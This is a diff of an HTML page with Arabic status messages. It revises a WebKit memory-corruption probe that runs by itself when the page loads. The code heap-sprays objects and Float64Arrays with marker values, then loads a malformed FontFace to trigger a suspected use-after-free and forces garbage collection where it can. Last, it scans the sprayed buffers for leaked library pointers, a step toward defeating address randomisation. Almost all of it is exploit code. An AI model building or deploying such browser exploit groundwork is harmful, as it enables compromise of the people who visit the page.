@@ -2,21 +2,21 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>WebKit Diagnostic Node</title>
+    <title>WebKit Advanced Layout Analysis</title>
     <style>
-        body { font-family: monospace; background: #111; color: #00ff00; padding: 20px; }
-        #status { font-weight: bold; color: #fff; }
-        #log { margin-top: 20px; color: #aaa; }
+        body { font-family: monospace; background: #0a0a0a; color: #00ff66; padding: 20px; line-height: 1.5; }
+        #status { font-weight: bold; color: #fff; text-shadow: 0 0 5px #00ff66; }
+        #log { margin-top: 20px; color: #00ddff; }
     </style>
 </head>
 <body>
-    <h1>WebKit Memory Area Analysis</h1>
-    <p>المؤشر الحالي: <span id="status">بدء التشغيل...</span></p>
+    <h1>WebKit Advanced Subspace Probing</h1>
+    <p>المؤشر الحالي: <span id="status">انتظار الأمر...</span></p>
     <div id="log"></div>
 
     <script>
-        var heapSpray = [];
-        var TARGET_SIZE = 0x1000; // 4KB Base Page
+        var propertySpray = [];
+        var totalAllocations = 600;
 
         function printLog(msg) {
             var logDiv = document.getElementById('log');
@@ -27,79 +27,90 @@
             document.getElementById('status').innerText = statusText;
         }
 
-        function startMemoryGrooming() {
-            updateStatus("جاري تهيئة مخصص الذاكرة...");
-            printLog("بدء حجز كتل الذاكرة المعزولة...");
+        function startAdvancedGrooming() {
+            updateStatus("جاري تهيئة الحشو البنيوي المتقدم...");
+            printLog("استهداف الفتحات الذاكرية المشتركة عبر كائنات مخصصة...");
 
             try {
-                // مرحلة تهيئة كتل الذاكرة المخصصة لتحديد هندسة التوزيع
-                for (var i = 0; i < 400; i++) {
-                    var blockSize = TARGET_SIZE + (i % 2 === 0 ? 16 : 32);
-                    heapSpray.push(new ArrayBuffer(blockSize));
+                // بدلاً من ArrayBuffer العادية، نقوم بإنشاء كائنات ذات خصائص متدرجة
+                // تحاكي الهيكل الداخلي لـ vptr والتأطير الديناميكي (16/32 بايت)
+                for (var i = 0; i < totalAllocations; i++) {
+                    var obj = {};
+                    // بناء تدرج داخلي في الذاكرة لتأمين مطابقة العناوين
+                    obj.inlinePropertyA = 0x41414141;
+                    obj.inlinePropertyB = (i % 2 === 0) ? 0x10101010 : 0x20202020;
+                    
+                    // إنشاء مصفوفة تعبئة مرنة لمحاكاة أحجام كتل كائنات الخطوط
+                    var dynamicPadding = new Float64Array(128 + (i % 4) * 4);
+                    dynamicPadding[0] = 1.1; // تلوث مبدئي للـ Float Heap
+                    
+                    obj.payload = dynamicPadding;
+                    propertySpray.push(obj);
                 }
-                printLog("تم تخصيص 400 كتلة ذاكرة بنجاح.");
-                triggerLifecycleTest();
+                
+                printLog("تم نشر الكائنات الهيكلية في فضاء الـ Heap.");
+                executeAdvancedLifecycleTest();
             } catch (e) {
-                updateStatus("فشل أثناء حجز الذاكرة");
+                updateStatus("فشل التخصيص الهيكلي");
                 printLog("خطأ: " + e.message);
             }
         }
 
-        function triggerLifecycleTest() {
-            updateStatus("جاري فحص دورة حياة كائن الخط...");
-            printLog("استدعاء واجهة FontFace لإنشاء حالة تعليق...");
-
+        function executeAdvancedLifecycleTest() {
+            updateStatus("بدء اختبار دورة حياة كائن الخط المعزول...");
+            
             try {
-                // ترويسة خط غير صالحة عمداً لتحفيز معالجة الخطأ برمجياً
-                var font = new FontFace('TestFont', 'url(data:font/opentype;base64,AAAA)');
+                // ترويسة خط معدلة لتحفيز التحرير والاحتفاظ المؤقت بالمرجع
+                var font = new FontFace('TestFont', 'url(data:font/opentype;base64,T1RUTwAAAA==)');
                 
                 font.load().then(function() {
-                    updateStatus("اكتمل التحميل بشكل غير متوقع");
+                    updateStatus("اكتمل التحميل (غير متوقع)");
                 }).catch(function(err) {
-                    updateStatus("حالة الخطأ نشطة (متوقع)");
-                    printLog("تم رصد إشارة الفشل. بدء فحص العناوين الملوثة...");
-                    // الانتقال المباشر لفحص محتويات الذاكرة المحجوزة
-                    executeScan();
+                    updateStatus("الحالة العكسية نشطة");
+                    printLog("تم التقاط إشارة الفشل. جاري محاولة التقاط العنوان الملوث...");
+                    
+                    // تحفيز محرك جمع القمامة بالتزامن مع فحص محتويات الكائنات المحشوة
+                    if (typeof gc === 'function') gc(); 
+                    
+                    runDeepScan();
                 });
             } catch (e) {
                 updateStatus("فشل استدعاء الواجهة");
-                printLog("خطأ في البنية: " + e.message);
+                printLog("خطأ: " + e.message);
             }
         }
 
-        function executeScan() {
-            updateStatus("جاري مسح فضاء العناوين...");
-            var foundLeak = false;
+        function runDeepScan() {
+            updateStatus("جاري فحص الخصائص الملوثة...");
+            var leakDetected = false;
 
-            for (var i = 0; i < heapSpray.length; i++) {
-                if (heapSpray[i].byteLength < 8) continue;
-                var view = new DataView(heapSpray[i]);
+            for (var i = 0; i < propertySpray.length; i++) {
+                var buffer = propertySpray[i].payload.buffer;
+                if (buffer.byteLength < 16) continue;
                 
+                var view = new DataView(buffer);
                 try {
-                    // محاولة قراءة المؤشرات الأولى في الكتلة الذاكرية
-                    var potentialAddress = view.getBigUint64(0, true);
+                    // مسح الكتل بحثاً عن قيم تشير إلى تداخل عناوين VTable
+                    var checkValue = view.getBigUint64(0, true);
                     
-                    // التحقق من النطاق المعياري لعناوين فضاء المستخدم للمكتبات المشتركة
-                    if (potentialAddress > 0x100000000n && potentialAddress < 0x800000000n) {
-                        updateStatus("تم رصد إزاحة عنوان نشطة!");
-                        printLog("مؤشر ملوث في الكتلة رقم [" + i + "]: 0x" + potentialAddress.toString(16));
-                        foundLeak = true;
+                    // التحقق من النطاقات الديناميكية للمكتبات المشتركة بالنظام
+                    if (checkValue > 0x100000000n && checkValue < 0x800000000n) {
+                        updateStatus("تم رصد تداخل العناوين بنجاح!");
+                        printLog("العنوان المسترجع في الكتلة [" + i + "]: 0x" + checkValue.toString(16));
+                        leakDetected = true;
                         break;
                     }
-                } catch (e) {
-                    // تجاوز أخطاء القراءة الحدودية
-                }
+                } catch (e) {}
             }
 
-            if (!foundLeak) {
-                updateStatus("اكتمل المسح دون رصد تداخل");
-                printLog("النتيجة: لم يتم العثور على مؤشرات حرة. قد يتطلب الأمر ضبط أحجام الكتل.");
+            if (!leakDetected) {
+                updateStatus("فحص سلبي - الذاكرة محمية تماماً ضد الهياكل الحالية");
+                printLog("النتيجة: مخصص bmalloc يحتفظ بالفصل. الخطوة التالية تتطلب تعديل استراتيجية الحشو البنيوي.");
             }
         }
 
-        // بدء التشغيل التلقائي بعد استقرار تراكيب الصفحة
         window.onload = function() {
-            setTimeout(startMemoryGrooming, 500);
+            setTimeout(startAdvancedGrooming, 600);
         };
     </script>
 </body>
